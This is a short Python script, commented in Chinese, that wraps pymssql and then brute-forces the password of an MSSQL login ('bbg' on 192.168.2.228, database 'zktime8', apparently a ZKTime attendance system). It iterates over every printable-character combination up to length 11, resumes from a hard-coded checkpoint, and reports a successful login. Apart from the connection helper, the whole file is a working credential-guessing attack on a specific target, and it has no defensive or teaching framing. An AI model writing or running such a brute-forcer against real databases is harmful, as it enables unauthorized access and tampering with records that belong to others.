import pymssql
import itertools
import string


# 上班考勤打卡
class MsSql:
    """
    对pymssql的简单封装

    """

    def __init__(self, host, user, pwd, db):
        self.host = host
        self.user = user
        self.pwd = pwd
        self.db = db

    def __GetConnect(self):
        """
        得到连接信息
        返回: conn.cursor()
        """
        if not self.db:
            raise (NameError, "没有设置数据库信息")
        self.conn = pymssql.connect(host=self.host, user=self.user, password=self.pwd, database=self.db, charset="utf8")
        cur = self.conn.cursor()
        if not cur:
            raise (NameError, "连接数据库失败")
        else:
            return cur

    def ExecQuery(self, sql):
        """
        执行查询语句
        返回的是一个包含tuple的list，list的元素是记录行，tuple的元素是每行记录的字段

        调用示例：
                ms = MSSQL(host="localhost",user="sa",pwd="123456",db="PythonWeiboStatistics")
                resList = ms.ExecQuery("SELECT id,NickName FROM WeiBoUser")
                for (id,NickName) in resList:
                    print str(id),NickName
        """
        cur = self.__GetConnect()
        cur.execute(sql)
        resList = cur.fetchall()

        # 查询完毕后必须关闭连接
        self.conn.close()
        return resList

    def ExecNonQuery(self, sql):
        """
        执行非查询语句

        调用示例：
            cur = self.__GetConnect()
            cur.execute(sql)
            self.conn.commit()
            self.conn.close()
        """
        cur = self.__GetConnect()
        cur.execute(sql)
        self.conn.commit()
        self.conn.close()


def crack_dict(max, min=1, chars=None):
    # 生成密码字典
    assert max >= min >= 1

    if chars is None:
        chars = string.printable[:-5]  # -38:数字+大小写字母，-64：数字+小写字母，-90：数字

    p = []
    for i in range(min, max + 1):
        p.append(itertools.product(chars, repeat=i))
    return itertools.chain(*p)


def main(n):
    password = crack_dict(n)
    i = 0
    for j in password:
        i += 1
        if i >= 197578:  # 断点
            try:
                ms = MsSql(host="192.168.2.228", user="bbg", pwd=''.join(tuple(j)),
                           db="zktime8")
                query = ms.ExecQuery("SELECT GETDATE() AS CurrentDateTime")
                print('Success!', j, ';', query)
                input('Wait........')
            except Exception as e:
                print('id:', i, '，try:', ''.join(tuple(j)), e)


if __name__ == '__main__':
    main(11)  # 密码长度
